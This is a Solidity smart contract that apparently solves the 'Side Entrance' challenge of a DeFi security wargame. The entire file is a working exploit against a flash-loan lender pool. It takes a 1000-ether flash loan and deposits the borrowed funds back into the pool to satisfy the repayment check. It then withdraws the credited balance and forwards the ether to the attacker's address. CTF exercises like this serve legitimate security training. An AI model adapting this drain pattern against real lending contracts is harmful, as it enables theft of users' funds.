// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SideEntranceAttack {
    using Address for address;
    using Address for address payable;

    SideEntranceLenderPool private immutable pool;
    address payable private immutable owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = payable(msg.sender);
    }

    function execute() external payable {
        address(pool).functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            1000 ether
        );
    }

    function attack() public {
        pool.flashLoan(1000 ether);
        pool.withdraw();
    }

    receive() external payable {
        owner.sendValue(1000 ether);
    }
}
